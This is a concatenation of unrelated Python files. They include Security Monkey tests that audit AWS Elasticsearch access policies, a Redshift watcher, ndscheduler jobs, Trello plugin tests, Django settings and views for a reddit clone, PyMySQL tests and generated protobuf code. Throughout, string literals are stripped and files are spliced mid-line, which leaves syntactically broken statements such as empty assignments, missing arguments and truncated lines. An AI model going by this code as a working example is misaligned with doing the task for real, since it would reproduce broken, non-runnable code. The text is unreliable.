CONFIG_SIX = { \n 
"name" : "es_test_6" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:role/a_good_role"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_6/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:ESHttp*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_6/*",\n          "Condition": {\n            "IpAddress": {\n              "aws:SourceIp": [\n                "192.168.1.1/32",\n                "100.0.0.1/16"\n              ]\n            }\n          }\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_SEVEN = { \n 
"name" : "es_test_7" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::012345678910:role/a_good_role"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_7/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:ESHttp*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_7/*",\n          "Condition": {\n            "IpAddress": {\n              "aws:SourceIp": [\n                "192.168.1.200/32",\n                "10.0.0.1/8"\n              ]\n            }\n          }\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_EIGHT = { \n 
"name" : "es_test_8" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "*"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_8/*"\n        },\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": "*",\n          "Action": "es:ESHttp*",\n          "Resource": "arn:aws:es:eu-west-1:012345678910:domain/es_test_8/*",\n          "Condition": {\n            "IpAddress": {\n              "aws:SourceIp": [\n                "192.168.1.1/32",\n                "100.0.0.1/16"\n              ]\n            }\n          }\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
CONFIG_NINE = { \n 
"name" : "es_test_9" , \n 
"policy" : json . loads ( b"""{\n      "Version": "2012-10-17",\n      "Statement": [\n        {\n          "Sid": "",\n          "Effect": "Allow",\n          "Principal": {\n            "AWS": "arn:aws:iam::111111111111:root"\n          },\n          "Action": "es:*",\n          "Resource": "arn:aws:es:us-east-1:012345678910:domain/es_test_9/*"\n        }\n      ]\n    }\n    """ ) \n 
} \n 
\n 
\n 
WHITELIST_CIDRS = [ \n 
( "Test one" , "192.168.1.1/32" ) , \n 
( "Test two" , "100.0.0.1/16" ) , \n 
] \n 
\n 
\n 
class ElasticSearchServiceTestCase ( SecurityMonkeyTestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . es_items = [ \n 
ElasticSearchServiceItem ( region = "us-east-1" , account = "TEST_ACCOUNT" , name = "es_test" , config = CONFIG_ONE ) , \n 
ElasticSearchServiceItem ( region = "us-west-2" , account = "TEST_ACCOUNT" , name = "es_test_2" , config = CONFIG_TWO ) , \n 
ElasticSearchServiceItem ( region = "eu-west-1" , account = "TEST_ACCOUNT" , name = "es_test_3" , config = CONFIG_THREE ) , \n 
ElasticSearchServiceItem ( region = "us-east-1" , account = "TEST_ACCOUNT" , name = "es_test_4" , config = CONFIG_FOUR ) , \n 
ElasticSearchServiceItem ( region = "us-east-1" , account = "TEST_ACCOUNT" , name = "es_test_5" , config = CONFIG_FIVE ) , \n 
ElasticSearchServiceItem ( region = "eu-west-1" , account = "TEST_ACCOUNT" , name = "es_test_6" , config = CONFIG_SIX ) , \n 
ElasticSearchServiceItem ( region = "eu-west-1" , account = "TEST_ACCOUNT" , name = "es_test_7" , config = CONFIG_SEVEN ) , \n 
ElasticSearchServiceItem ( region = "eu-west-1" , account = "TEST_ACCOUNT" , name = "es_test_8" , config = CONFIG_EIGHT ) , \n 
ElasticSearchServiceItem ( region = "us-east-1" , account = "TEST_ACCOUNT" , name = "es_test_9" , config = CONFIG_NINE ) , \n 
] \n 
\n 
# Add the fake source account into the database: \n 
test_account = Account ( ) \n 
test_account . name = "TEST_ACCOUNT" \n 
test_account . notes = "TEST ACCOUNT" \n 
test_account . s3_name = "TEST_ACCOUNT" \n 
test_account . number = "012345678910" \n 
test_account . role_name = "TEST_ACCOUNT" \n 
\n 
db . session . add ( test_account ) \n 
db . session . commit ( ) \n 
\n 
~~ def tearDown ( self ) : \n 
# Remove the fake source account from the database: \n 
~~~ test_account = Account . query . filter ( Account . number == "012345678910" ) . first ( ) \n 
if test_account is not None : \n 
~~~ db . session . delete ( test_account ) \n 
db . session . commit ( ) \n 
\n 
~~ ~~ def test_es_auditor ( self ) : \n 
~~~ from security_monkey . auditors . elasticsearch_service import ElasticSearchServiceAuditor \n 
es_auditor = ElasticSearchServiceAuditor ( accounts = [ "012345678910" ] ) \n 
\n 
# Add some test network whitelists into this: \n 
es_auditor . network_whitelist = [ ] \n 
for cidr in WHITELIST_CIDRS : \n 
~~~ whitelist_cidr = NetworkWhitelistEntry ( ) \n 
whitelist_cidr . cidr = cidr [ 1 ] \n 
whitelist_cidr . name = cidr [ 0 ] \n 
\n 
es_auditor . network_whitelist . append ( whitelist_cidr ) \n 
\n 
~~ for es_domain in self . es_items : \n 
~~~ es_auditor . check_es_access_policy ( es_domain ) \n 
\n 
# Check for correct number of issues located: \n 
# CONFIG ONE: \n 
~~ self . assertEquals ( len ( self . es_items [ 0 ] . audit_issues ) , 1 ) \n 
self . assertEquals ( self . es_items [ 0 ] . audit_issues [ 0 ] . score , 20 ) \n 
\n 
# CONFIG TWO: \n 
self . assertEquals ( len ( self . es_items [ 1 ] . audit_issues ) , 1 ) \n 
self . assertEquals ( self . es_items [ 1 ] . audit_issues [ 0 ] . score , 20 ) \n 
\n 
# CONFIG THREE: \n 
self . assertEquals ( len ( self . es_items [ 2 ] . audit_issues ) , 2 ) \n 
self . assertEquals ( self . es_items [ 2 ] . audit_issues [ 0 ] . score , 5 ) \n 
self . assertEquals ( self . es_items [ 2 ] . audit_issues [ 1 ] . score , 7 ) \n 
\n 
# CONFIG FOUR: \n 
self . assertEquals ( len ( self . es_items [ 3 ] . audit_issues ) , 1 ) \n 
self . assertEquals ( self . es_items [ 3 ] . audit_issues [ 0 ] . score , 20 ) \n 
\n 
# CONFIG FIVE: \n 
self . assertEquals ( len ( self . es_items [ 4 ] . audit_issues ) , 0 ) \n 
\n 
# CONFIG SIX: \n 
self . assertEquals ( len ( self . es_items [ 5 ] . audit_issues ) , 0 ) \n 
\n 
# CONFIG SEVEN: \n 
self . assertEquals ( len ( self . es_items [ 6 ] . audit_issues ) , 3 ) \n 
self . assertEquals ( self . es_items [ 6 ] . audit_issues [ 0 ] . score , 5 ) \n 
self . assertEquals ( self . es_items [ 6 ] . audit_issues [ 1 ] . score , 5 ) \n 
self . assertEquals ( self . es_items [ 6 ] . audit_issues [ 2 ] . score , 7 ) \n 
\n 
# CONFIG EIGHT: \n 
self . assertEquals ( len ( self . es_items [ 7 ] . audit_issues ) , 1 ) \n 
self . assertEquals ( self . es_items [ 7 ] . audit_issues [ 0 ] . score , 20 ) \n 
\n 
# CONFIG NINE: \n 
self . assertEquals ( len ( self . es_items [ 8 ] . audit_issues ) , 2 ) \n 
self . assertEquals ( self . es_items [ 8 ] . audit_issues [ 0 ] . score , 6 ) \n 
self . assertEquals ( self . es_items [ 8 ] . audit_issues [ 1 ] . score , 10 ) \n 
#     Copyright 2014 Yelp, Inc. \n 
# \n 
#     Licensed under the Apache License, Version 2.0 (the "License"); \n 
#     you may not use this file except in compliance with the License. \n 
#     You may obtain a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#     Unless required by applicable law or agreed to in writing, software \n 
#     distributed under the License is distributed on an "AS IS" BASIS, \n 
#     WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
#     See the License for the specific language governing permissions and \n 
#     limitations under the License. \n 
~~ ~~ """\n.. module: security_monkey.watchers.redshift\n    :platform: Unix\n\n.. version:: $$VERSION$$\n.. moduleauthor:: Ivan Leichtling <ivanlei@yelp.com> @c0wl\n\n""" \n 
\n 
from security_monkey . watcher import Watcher \n 
from security_monkey . watcher import ChangeItem \n 
from security_monkey . constants import TROUBLE_REGIONS \n 
from security_monkey . exceptions import BotoConnectionIssue \n 
from security_monkey import app \n 
\n 
from boto . redshift import regions \n 
\n 
\n 
class Redshift ( Watcher ) : \n 
~~~ index = \n 
i_am_singular = \n 
i_am_plural = \n 
\n 
def __init__ ( self , accounts = None , debug = False ) : \n 
~~~ super ( Redshift , self ) . __init__ ( accounts = accounts , debug = debug ) \n 
\n 
~~ def slurp ( self ) : \n 
~~~ """\n        :returns: item_list - list of Redshift Policies.\n        :returns: exception_map - A dict where the keys are a tuple containing the\n            location of the exception and the value is the actual exception\n\n        """ \n 
self . prep_for_slurp ( ) \n 
from security_monkey . common . sts_connect import connect \n 
item_list = [ ] \n 
exception_map = { } \n 
for account in self . accounts : \n 
~~~ for region in regions ( ) : \n 
~~~ app . logger . debug ( "Checking {}/{}/{}" . format ( self . index , account , region . name ) ) \n 
try : \n 
~~~ redshift = connect ( account , , region = region ) \n 
\n 
all_clusters = [ ] \n 
marker = None \n 
while True : \n 
~~~ response = self . wrap_aws_rate_limited_call ( \n 
redshift . describe_clusters , \n 
marker = marker \n 
) \n 
all_clusters . extend ( response [ ] [ if response [ ] [ ] [ ] ~~~ marker = response [ ] [ ] [ ~~ else : \n 
~~~ break \n 
\n 
~~ ~~ ~~ except Exception as e : \n 
~~~ if region . name not in TROUBLE_REGIONS : \n 
~~~ exc = BotoConnectionIssue ( str ( e ) , , account , region . name ) \n 
self . slurp_exception ( ( self . index , account , region . name ) , exc , exception_map ) ~~ continue \n 
~~ app . logger . debug ( "Found {} {}" . format ( len ( all_clusters ) , Redshift . i_am_plural ) ) \n 
for cluster in all_clusters : \n 
~~~ cluster_id = cluster [ ] \n 
if self . check_ignore_list ( cluster_id ) : \n 
~~~ continue \n 
\n 
~~ item = RedshiftCluster ( region = region . name , account = account , name = cluster_id , config item_list . append ( item ) \n 
\n 
~~ ~~ ~~ return item_list , exception_map \n 
\n 
\n 
~~ ~~ class RedshiftCluster ( ChangeItem ) : \n 
~~~ def __init__ ( self , region = None , account = None , name = None , config = { } ) : \n 
~~~ super ( RedshiftCluster , self ) . __init__ ( \n 
index = Redshift . index , \n 
region = region , \n 
account = account , \n 
name = name , \n 
new_config = config ) \n 
~~ ~~ """Represents PostgreSQL datastore.""" \n 
\n 
from ndscheduler import settings \n 
from ndscheduler . core . datastore . providers import base \n 
\n 
\n 
class DatastorePostgresql ( base . DatastoreBase ) : \n 
\n 
~~~ @ classmethod \n 
def get_db_url ( cls ) : \n 
~~~ """\n        DATABASE_CONFIG_DICT = {\n            \'user\': \'myuser\',\n            \'password\': \'password\',\n            \'hostname\': \'mydb.domain.com\',\n            \'port\': 5432,\n            \'database\': \'mydatabase\',\n            \'sslmode\': \'disable\'\n        }\n\n        :return: database url\n        :rtype: str\n        """ \n 
\n 
return % ( \n 
settings . DATABASE_CONFIG_DICT [ ] , \n 
settings . DATABASE_CONFIG_DICT [ ] , \n 
settings . DATABASE_CONFIG_DICT [ ] , \n 
settings . DATABASE_CONFIG_DICT [ ] , \n 
settings . DATABASE_CONFIG_DICT [ ] , \n 
settings . DATABASE_CONFIG_DICT [ ] ) \n 
~~ ~~ """A job to send a HTTP (GET or DELETE) periodically.""" \n 
\n 
import logging \n 
import requests \n 
\n 
from ndscheduler import job \n 
\n 
logger = logging . getLogger ( __name__ ) \n 
\n 
\n 
class CurlJob ( job . JobBase ) : \n 
~~~ TIMEOUT = 10 \n 
\n 
@ classmethod \n 
def meta_info ( cls ) : \n 
~~~ return { \n 
: % ( cls . __module__ , cls . __name__ ) , \n 
: , \n 
: [ \n 
# url \n 
{ : , : } , \n 
# Request Type \n 
{ : , : \n 
} , \n 
\n 
] , \n 
: ( \'["http://localhost:8888/api/v1/jobs", "GET"]\' \n 
\'["http://localhost:8888/api/v1/jobs/ba12e", "DELETE"]\' ) \n 
} \n 
\n 
~~ def run ( self , url , request_type , * args , ** kwargs ) : \n 
~~~ print ( % ( url ) ) \n 
\n 
session = requests . Session ( ) \n 
result = session . request ( request_type , \n 
url , \n 
timeout = self . TIMEOUT , \n 
headers = None , \n 
data = None ) \n 
print ( result . text ) \n 
\n 
\n 
~~ ~~ if __name__ == "__main__" : \n 
~~~ job = CurlJob . create_test_instance ( ) \n 
job . run ( ) \n 
~~ import unittest \n 
from . mock import MagicMock , Mock \n 
from . util import TrelloElementMock , CommandMock , OperationMock \n 
\n 
from operations import * \n 
\n 
class BaseOperationTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . base_operation , self . trello_element = OperationMock . create ( BaseOperation ) \n 
self . class_mock , self . instance_mock = OperationMock . instance ( self . base_operation ) \n 
self . collection = TrelloElementMock . collection ( ) \n 
self . base_operation . collection = TrelloCollection ( self . collection ) \n 
\n 
~~ def test_items_sets_the_collection ( self ) : \n 
~~~ self . base_operation . set_collection = MagicMock ( ) \n 
self . base_operation . items ( ) \n 
self . base_operation . set_collection . assert_called_with ( ) \n 
\n 
~~ def test_items_returns_every_name_from_the_collection_with_the_added_options ( self ) : \n 
~~~ self . base_operation . set_collection = MagicMock ( ) \n 
self . assertEqual ( self . base_operation . items ( ) , [ ".." , "Open in Browser" , "Create Base" , "first" \n 
~~ def test_callback_uses_find_to_instantiate_the_operation_if_the_index_is_in_the_collection ( self ) ~~~ self . base_operation . callback ( 3 ) \n 
self . class_mock . assert_called_with ( self . collection [ 0 ] , self . base_operation ) \n 
\n 
~~ def test_callback_calls_execute_on_the_operation ( self ) : \n 
~~~ self . base_operation . callback ( 3 ) \n 
self . instance_mock . execute . assert_called_with ( self . base_operation . command ) \n 
\n 
~~ def test_callback_doesnt_call_find_if_the_index_is_bigger_than_the_collection_length ( self ) : \n 
~~~ big_index = 55 \n 
self . base_operation . callback ( big_index ) \n 
assert not self . class_mock . called \n 
\n 
~~ def test_callback_calls_execute_on_the_previous_operation_if_index_is_0 ( self ) : \n 
~~~ self . base_operation . callback ( 0 ) \n 
self . base_operation . previous_operation . execute . assert_called_with ( ) \n 
\n 
~~ def test_callback_calls_the_input_method_on_the_command_with_deferred_add_as_callback_if_index_is_1 ~~~ self . base_operation . command . input = MagicMock ( ) \n 
self . base_operation . callback ( 2 ) \n 
self . base_operation . command . input . assert_called_with ( "Name" , self . base_operation . deferred_add \n 
~~ def test_base_add_calls_add_with_the_text_and_cleans_the_cache_for_the_element ( self ) : \n 
~~~ text = "Text" \n 
self . base_operation . add = MagicMock ( ) \n 
self . base_operation . trello_element . reload = MagicMock ( ) \n 
self . base_operation . base_add ( text ) \n 
self . base_operation . add . assert_called_with ( text ) \n 
self . trello_element . reload . assert_called_with ( ) \n 
\n 
~~ def test_base_add_calls_add_and_execute_if_renavigate_is_true ( self ) : \n 
~~~ text = "Text" \n 
self . base_operation . command . renavigate = True \n 
self . base_operation . execute = MagicMock ( ) \n 
self . base_operation . base_add ( text ) \n 
self . base_operation . execute . assert_called_with ( ) \n 
\n 
~~ ~~ class BoardOperationTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . operation , self . trello_element = OperationMock . create ( BoardOperation ) \n 
self . operation . collection = TrelloCollection ( TrelloElementMock . collection ( ) ) \n 
\n 
~~ def test_items_returns_every_name_from_the_collection_without_goback ( self ) : \n 
~~~ self . operation . set_collection = MagicMock ( ) \n 
self . assertEqual ( self . operation . items ( ) , [ "Open in Browser" , "Create Board" , "first" , "second" \n 
~~ def test_trello_element_property ( self ) : \n 
~~~ self . assertEqual ( self . operation . trello_element_property ( ) , "boards" ) \n 
\n 
~~ def test_callback_calls_execute_command_with_the_index ( self ) : \n 
~~~ self . operation . execute_command = MagicMock ( ) \n 
self . operation . callback ( 5 ) \n 
self . operation . execute_command . assert_called_with ( 3 ) \n 
\n 
~~ def test_callback_calls_the_input_method_on_the_command_with_deferred_add_as_callback_if_index_is_1 ~~~ self . operation . command . input = MagicMock ( ) \n 
self . operation . callback ( 1 ) \n 
self . operation . command . input . assert_called_with ( "Name" , self . operation . deferred_add ) \n 
\n 
~~ def test_next_operation_class ( self ) : \n 
~~~ self . assertEqual ( self . operation . next_operation_class ( ) , ListOperation ) \n 
\n 
~~ def test_add_creates_a_board_with_the_text ( self ) : \n 
~~~ text = "Some Text" \n 
self . trello_element . add_board = MagicMock ( ) \n 
self . operation . add ( text ) \n 
self . trello_element . add_board . assert_called_with ( text ) \n 
\n 
~~ ~~ class ListOperationTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . operation , self . trello_element = OperationMock . create ( ListOperation ) \n 
\n 
~~ def test_trello_element_property ( self ) : \n 
~~~ self . assertEqual ( self . operation . trello_element_property ( ) , "lists" ) \n 
\n 
~~ def test_next_operation_class ( self ) : \n 
~~~ self . assertEqual ( self . operation . next_operation_class ( ) , CardOperation ) \n 
\n 
~~ def test_add_creates_a_list_with_the_text ( self ) : \n 
~~~ text = "Some Text" \n 
self . trello_element . add_list = MagicMock ( ) \n 
self . operation . add ( text ) \n 
self . trello_element . add_list . assert_called_with ( text ) \n 
\n 
~~ ~~ class CardOperationTests ( unittest . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . operation , self . trello_element = OperationMock . create ( CardOperation ) \n 
\n 
~~ def test_items_returns_every_name_from_the_collection_with_custom_actions ( self ) : \n 
~~~ self . operation . set_collection = MagicMock ( ) \n 
self . operation . collection = TrelloCollection ( TrelloElementMock . collection ( ) ) \n 
self . assertEqual ( self . operation . items ( ) , [ , , \n 
~~ def test_trello_element_property ( self ) : \n 
~~~ self . assertEqual ( self . operation . trello_element_property ( ) , "cards" ) \n 
\n 
~~ def test_next_operation_class ( self ) : \n 
~~~ self . assertEqual ( self . operation . next_operation_class ( ) , CardOptions ) \n 
\n 
~~ def test_add_creates_a_card_with_the_text_and_description ( self ) : \n 
~~~ name = "Some Text" \n 
desc = "Some Desc" \n 
self . trello_element . add_card = MagicMock ( ) \n 
self . operation . add ( name , desc ) \n 
self . trello_element . add_card . assert_called_with ( name , desc ) \n 
\n 
~~ def test_split_card_contents_returns_the_name_and_description_splitted_by_new_lines ( self ) : \n 
~~~ content = "Name!!\\n\\nDescription\\nYeah!" \n 
name , desc = self . operation . split_card_contents ( content ) \n 
self . assertEqual ( name , "Name!!" ) \n 
self . assertEqual ( desc , "Description\\nYeah!" ) \n 
\n 
\n 
~~ ~~ if __name__ == : \n 
~~~ unittest . main ( ) # -*- coding: utf-8 -*- \n 
~~ \n 
\n 
from . common import * # noqa \n 
\n 
# DEBUG \n 
# ------------------------------------------------------------------------------ \n 
DEBUG = env . bool ( , default = True ) \n 
TEMPLATES [ 0 ] [ ] [ ] = DEBUG \n 
\n 
# SECRET CONFIGURATION \n 
# ------------------------------------------------------------------------------ \n 
# See: https://docs.djangoproject.com/en/dev/ref/settings/#secret-key \n 
# Note: This key only used for development and testing. \n 
SECRET_KEY = env ( "DJANGO_SECRET_KEY" , default = ) \n 
\n 
# Mail settings \n 
# ------------------------------------------------------------------------------ \n 
EMAIL_HOST = \n 
EMAIL_PORT = 1025 \n 
EMAIL_BACKEND = env ( , \n 
default = ) \n 
\n 
# CACHING \n 
# ------------------------------------------------------------------------------ \n 
CACHES = { \n 
: { \n 
: , \n 
: \n 
} \n 
} \n 
\n 
# django-debug-toolbar \n 
# ------------------------------------------------------------------------------ \n 
MIDDLEWARE_CLASSES += ( , ) \n 
INSTALLED_APPS += ( , ) \n 
\n 
INTERNAL_IPS = ( , , ) \n 
\n 
DEBUG_TOOLBAR_CONFIG = { \n 
: [ \n 
, \n 
] , \n 
: True , \n 
} \n 
\n 
\n 
# TESTING \n 
# ------------------------------------------------------------------------------ \n 
TEST_RUNNER = \n 
# Your local stuff: Below this line define 3rd party library settings \n 
from django . contrib import messages \n 
from django . contrib . auth import logout , login , authenticate \n 
from django . contrib . auth . decorators import login_required \n 
from django . contrib . auth . models import User \n 
from django . http import HttpResponseBadRequest , Http404 \n 
from django . shortcuts import render , redirect , get_object_or_404 \n 
\n 
from reddit . forms import UserForm , ProfileForm \n 
from reddit . utils . helpers import post_only \n 
from users . models import RedditUser \n 
\n 
\n 
def user_profile ( request , username ) : \n 
~~~ user = get_object_or_404 ( User , username = username ) \n 
profile = RedditUser . objects . get ( user = user ) \n 
\n 
return render ( request , , { : profile } ) \n 
\n 
\n 
~~ @ login_required \n 
def edit_profile ( request ) : \n 
~~~ user = RedditUser . objects . get ( user = request . user ) \n 
\n 
if request . method == : \n 
~~~ profile_form = ProfileForm ( instance = user ) \n 
\n 
~~ elif request . method == : \n 
~~~ profile_form = ProfileForm ( request . POST , instance = user ) \n 
if profile_form . is_valid ( ) : \n 
~~~ profile = profile_form . save ( commit = False ) \n 
profile . update_profile_data ( ) \n 
profile . save ( ) \n 
messages . success ( request , "Profile settings saved" ) \n 
~~ ~~ else : \n 
~~~ raise Http404 \n 
\n 
~~ return render ( request , , { : profile_form } ) \n 
\n 
\n 
~~ def user_login ( request ) : \n 
~~~ """\n    Pretty straighforward user authentication using password and username\n    supplied in the POST request.\n    """ \n 
\n 
if request . user . is_authenticated ( ) : \n 
~~~ messages . warning ( request , "You are already logged in." ) \n 
return render ( request , ) \n 
\n 
~~ if request . method == "POST" : \n 
~~~ username = request . POST . get ( ) \n 
password = request . POST . get ( ) \n 
if not username or not password : \n 
~~~ return HttpResponseBadRequest ( ) \n 
\n 
~~ user = authenticate ( username = username , \n 
password = password ) \n 
\n 
if user : \n 
~~~ if user . is_active : \n 
~~~ login ( request , user ) \n 
redirect_url = request . POST . get ( ) or \n 
return redirect ( redirect_url ) \n 
~~ else : \n 
~~~ return render ( request , , \n 
{ : "Account disabled" } ) \n 
~~ ~~ else : \n 
~~~ return render ( request , , \n 
{ : "Wrong username or password." } ) \n 
\n 
~~ ~~ return render ( request , ) \n 
\n 
\n 
~~ @ post_only \n 
def user_logout ( request ) : \n 
~~~ """\n    Log out user if one is logged in and redirect them to frontpage.\n    """ \n 
\n 
if request . user . is_authenticated ( ) : \n 
~~~ redirect_page = request . POST . get ( , ) \n 
logout ( request ) \n 
messages . success ( request , ) \n 
return redirect ( redirect_page ) \n 
~~ return redirect ( ) \n 
\n 
\n 
~~ def register ( request ) : \n 
~~~ """\n    Handles user registration using UserForm from forms.py\n    Creates new User and new RedditUser models if appropriate data\n    has been supplied.\n\n    If account has been created user is redirected to login page.\n    """ \n 
user_form = UserForm ( ) \n 
if request . user . is_authenticated ( ) : \n 
~~~ messages . warning ( request , \n 
) \n 
return render ( request , , { : user_form } ) \n 
\n 
~~ if request . method == "POST" : \n 
~~~ user_form = UserForm ( request . POST ) \n 
\n 
if user_form . is_valid ( ) : \n 
~~~ user = user_form . save ( ) \n 
user . set_password ( user . password ) \n 
user . save ( ) \n 
reddit_user = RedditUser ( ) \n 
reddit_user . user = user \n 
reddit_user . save ( ) \n 
user = authenticate ( username = request . POST [ ] , \n 
password = request . POST [ ] ) \n 
login ( request , user ) \n 
return redirect ( ) \n 
\n 
~~ ~~ return render ( request , , { : user_form } ) \n 
~~ import unittest2 \n 
\n 
from pymysql . tests import base \n 
from pymysql import util \n 
\n 
\n 
class TestNextset ( base . PyMySQLTestCase ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ super ( TestNextset , self ) . setUp ( ) \n 
self . con = self . connections [ 0 ] \n 
\n 
~~ def test_nextset ( self ) : \n 
~~~ cur = self . con . cursor ( ) \n 
cur . execute ( "SELECT 1; SELECT 2;" ) \n 
self . assertEqual ( [ ( 1 , ) ] , list ( cur ) ) \n 
\n 
r = cur . nextset ( ) \n 
self . assertTrue ( r ) \n 
\n 
self . assertEqual ( [ ( 2 , ) ] , list ( cur ) ) \n 
self . assertIsNone ( cur . nextset ( ) ) \n 
\n 
~~ def test_skip_nextset ( self ) : \n 
~~~ cur = self . con . cursor ( ) \n 
cur . execute ( "SELECT 1; SELECT 2;" ) \n 
self . assertEqual ( [ ( 1 , ) ] , list ( cur ) ) \n 
\n 
cur . execute ( "SELECT 42" ) \n 
self . assertEqual ( [ ( 42 , ) ] , list ( cur ) ) \n 
\n 
~~ def test_ok_and_next ( self ) : \n 
~~~ cur = self . con . cursor ( ) \n 
cur . execute ( "SELECT 1; commit; SELECT 2;" ) \n 
self . assertEqual ( [ ( 1 , ) ] , list ( cur ) ) \n 
self . assertTrue ( cur . nextset ( ) ) \n 
self . assertTrue ( cur . nextset ( ) ) \n 
self . assertEqual ( [ ( 2 , ) ] , list ( cur ) ) \n 
self . assertFalse ( bool ( cur . nextset ( ) ) ) \n 
\n 
~~ @ unittest2 . expectedFailure \n 
def test_multi_cursor ( self ) : \n 
~~~ cur1 = self . con . cursor ( ) \n 
cur2 = self . con . cursor ( ) \n 
\n 
cur1 . execute ( "SELECT 1; SELECT 2;" ) \n 
cur2 . execute ( "SELECT 42" ) \n 
\n 
self . assertEqual ( [ ( 1 , ) ] , list ( cur1 ) ) \n 
self . assertEqual ( [ ( 42 , ) ] , list ( cur2 ) ) \n 
\n 
r = cur1 . nextset ( ) \n 
self . assertTrue ( r ) \n 
\n 
self . assertEqual ( [ ( 2 , ) ] , list ( cur1 ) ) \n 
self . assertIsNone ( cur1 . nextset ( ) ) \n 
\n 
~~ def test_multi_statement_warnings ( self ) : \n 
~~~ cursor = self . con . cursor ( ) \n 
\n 
try : \n 
~~~ cursor . execute ( \n 
) \n 
~~ except TypeError : \n 
~~~ self . fail ( ) \n 
\n 
#TODO: How about SSCursor and nextset? \n 
\n 
# Generated by the protocol buffer compiler.  DO NOT EDIT! \n 
# source: PushNotificationMessage.proto \n 
\n 
~~ ~~ ~~ from google . protobuf import descriptor as _descriptor \n 
from google . protobuf import message as _message \n 
from google . protobuf import reflection as _reflection \n 
from google . protobuf import descriptor_pb2 \n 
# @@protoc_insertion_point(imports) \n 
\n 
\n 
\n 
\n 
DESCRIPTOR = _descriptor . FileDescriptor ( \n 
name = , \n 
package = , \n 
serialized_pb = \'\\n\\x1dPushNotificationMessage.proto\\"T\\n\\x10PushNotification\\x12\\x10\\n\\x08login_id\\x18\\x01 \\x01(\\x03\\x12\\r\\n\\x05title\\x18\\x02 \\x01(\\t\\x12\\x0f\\n\\x07\\x63ontent\\x18\\x03 \\x01(\\t\\x12\\x0e\\n\\x06screen\\x18\\x04 \\x01(\\t\\"D\\n\\x18\\x42\\x61tchNotificationRequest\\x12(\\n\\rnotifications\\x18\\x01 \\x03(\\x0b\\x32\\x11.PushNotificationB\\x1b\\n\\x19\\x65u.nordeus.tracking.proto\' \n 
_PUSHNOTIFICATION = _descriptor . Descriptor ( \n 
name = , \n 
full_name = , \n 
filename = None , \n 
file = DESCRIPTOR , \n 
containing_type = None , \n 
fields = [ \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 0 , \n 
number = 1 , type = 3 , cpp_type = 2 , label = 1 , \n 
has_default_value = False , default_value = 0 , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 1 , \n 
number = 2 , type = 9 , cpp_type = 9 , label = 1 , \n 
has_default_value = False , default_value = unicode ( "" , "utf-8" ) , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 2 , \n 
number = 3 , type = 9 , cpp_type = 9 , label = 1 , \n 
has_default_value = False , default_value = unicode ( "" , "utf-8" ) , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 3 , \n 
number = 4 , type = 9 , cpp_type = 9 , label = 1 , \n 
has_default_value = False , default_value = unicode ( "" , "utf-8" ) , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
] , \n 
extensions = [ \n 
] , \n 
nested_types = [ ] , \n 
enum_types = [ \n 
] , \n 
options = None , \n 
is_extendable = False , \n 
extension_ranges = [ ] , \n 
serialized_start = 33 , \n 
serialized_end = 117 , \n 
) \n 
\n 
_BATCHNOTIFICATIONREQUEST = _descriptor . Descriptor ( \n 
name = , \n 
full_name = , \n 
filename = None , \n 
file = DESCRIPTOR , \n 
containing_type = None , \n 
fields = [ \n 
_descriptor . FieldDescriptor ( \n 
name = , full_name = , index = 0 , \n 
number = 1 , type = 11 , cpp_type = 10 , label = 3 , \n 
has_default_value = False , default_value = [ ] , \n 
message_type = None , enum_type = None , containing_type = None , \n 
is_extension = False , extension_scope = None , \n 
options = None ) , \n 
] , \n 
extensions = [ \n 
] , \n 
nested_types = [ ] , \n 
enum_types = [ \n 
] , \n 
options = None , \n 
is_extendable = False , \n 
extension_ranges = [ ] , \n 
serialized_start = 119 , \n 
serialized_end = 187 , \n 
) \n 
\n 
_BATCHNOTIFICATIONREQUEST . fields_by_name [ ] . message_type = _PUSHNOTIFICATION \n 
DESCRIPTOR . message_types_by_name [ ] = _PUSHNOTIFICATION \n 
DESCRIPTOR . message_types_by_name [ ] = _BATCHNOTIFICATIONREQUEST \n 
\n 
\n 
